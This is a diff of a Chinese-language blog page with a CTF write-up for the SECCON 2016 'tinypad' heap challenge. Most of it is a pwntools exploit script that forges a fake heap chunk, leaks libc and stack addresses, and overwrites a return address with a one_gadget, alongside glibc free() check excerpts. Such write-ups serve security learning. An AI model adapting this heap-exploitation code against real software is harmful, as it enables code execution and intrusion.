+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>           <span class=c1># consolidate with top chunk, avoid malloc unsorted bin check error</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>先分配处0xf8，而后使用临近的块溢出，在tinypad处构造fake chunk，释放memo4和memo1，先后与top chunk进行合并。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -318,38 +151,30 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>21
 </span><span class=lnt>22
 </span><span class=lnt>23
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># leak libc</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0xe8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;strlen&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># avoid free error</span>
-<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
-<span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-<span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x14CBC0</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-<span class=c1># leak stack</span>
-<span class=c1># gdb.attach(io, &#34;b *0x4009BC&#34;)</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;environ&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
-<span class=n>stack_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-<span class=n>mainret_addr</span> <span class=o>=</span> <span class=n>stack_addr</span> <span class=o>-</span> <span class=mh>0xf0</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-
-<span class=c1># edit return address</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>mainret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-<span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-
-<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-<span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Q&#34;</span><span class=p>)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>分配得到数组处的地址，多次释放分配这个数组，来对它进行修改。</p>
-<p>直接释放<code>tinypad+0x100</code>，在对后一个chunk的检查会出错，使用<code>add(0x40, "\n")</code>分配一个合法的后一个chunk。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># leak libc</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xe8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;strlen&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># avoid free error</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x14CBC0</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># leak stack</span>
+</span></span><span class=line><span class=cl><span class=c1># gdb.attach(io, &#34;b *0x4009BC&#34;)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;environ&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 2</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stack_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>mainret_addr</span> <span class=o>=</span> <span class=n>stack_addr</span> <span class=o>-</span> <span class=mh>0xf0</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># edit return address</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>mainret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Q&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>分配得到数组处的地址，多次释放分配这个数组，来对它进行修改。</p><p>直接释放<code>tinypad+0x100</code>，在对后一个chunk的检查会出错，使用<code>add(0x40, "\n")</code>分配一个合法的后一个chunk。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -366,32 +191,24 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>15
 </span><span class=lnt>16
 </span><span class=lnt>17
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 释放fastbin大小对后一个chunk的检查
-</span><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>have_lock</span><span class=p>)</span>
-<span class=p>{</span>
-    <span class=n>__libc_lock_lock</span> <span class=p>(</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
-    <span class=n>fail</span> <span class=o>=</span> <span class=p>(</span><span class=n>chunksize_nomask</span> <span class=p>(</span><span class=n>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span>
-            <span class=o>||</span> <span class=n>chunksize</span> <span class=p>(</span><span class=n>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>);</span>
-    <span class=n>__libc_lock_unlock</span> <span class=p>(</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=k>if</span> <span class=p>(</span><span class=n>fail</span><span class=p>)</span>
-    <span class=n>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;free(): invalid next size (fast)&#34;</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=c1>// 释放非fastbin大小对后一个chunk的检查
-</span><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>__builtin_expect</span> <span class=p>(</span><span class=n>chunksize_nomask</span> <span class=p>(</span><span class=n>nextchunk</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
-	<span class=o>||</span> <span class=n>__builtin_expect</span> <span class=p>(</span><span class=n>nextsize</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
-      <span class=n>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;free(): invalid next size (normal)&#34;</span><span class=p>);</span>
-</code></pre></td></tr></table>
-</div>
-</div><h3 id=exploit>exploit</h3>
-<p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/SECON2016%20tinypad/exp.py>exp</a></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 释放fastbin大小对后一个chunk的检查
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>have_lock</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>__libc_lock_lock</span> <span class=p>(</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>fail</span> <span class=o>=</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=nf>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span>
+</span></span><span class=line><span class=cl>            <span class=o>||</span> <span class=nf>chunksize</span> <span class=p>(</span><span class=nf>chunk_at_offset</span> <span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>__libc_lock_unlock</span> <span class=p>(</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>fail</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;free(): invalid next size (fast)&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// 释放非fastbin大小对后一个chunk的检查
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>nextchunk</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=o>||</span> <span class=nf>__builtin_expect</span> <span class=p>(</span><span class=n>nextsize</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>      <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;free(): invalid next size (normal)&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=exploit>exploit</h3><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/SECON2016%20tinypad/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -485,177 +302,117 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>92
 </span><span class=lnt>93
 </span><span class=lnt>94
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
-
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-
-<span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
-<span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./tinypad&#34;</span>
-<span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&#34;</span>
-
-<span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(SIZE)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CONTENT)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
-
-<span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;E&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(INDEX)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CONTENT)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(Y/n)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;Y&#34;</span><span class=p>)</span>
-
-<span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(CMD)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;D&#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;(INDEX)&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
-
-<span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
-    <span class=n>tinypad</span>    <span class=o>=</span> <span class=mh>0x602040</span>
-    <span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x40d82</span>
-
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 1: 0x30</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 2: 0x30</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 3: 0x100</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># 4: 0x90</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
-
-    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 1</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
-    <span class=n>heap_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-    <span class=n>heap_base</span> <span class=o>=</span> <span class=n>heap_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>)</span>
-    <span class=n>fake_size</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=n>tinypad</span>
-
-    <span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># 1: 0x100</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># 2: 0x30</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x20</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># 3: 0x30</span>
-
-    <span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>           <span class=c1># consolidate with top chunk, avoid malloc unsorted bin check error</span>
-    <span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-    
-    <span class=n>add</span><span class=p>(</span><span class=mh>0xe8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-    <span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;strlen&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
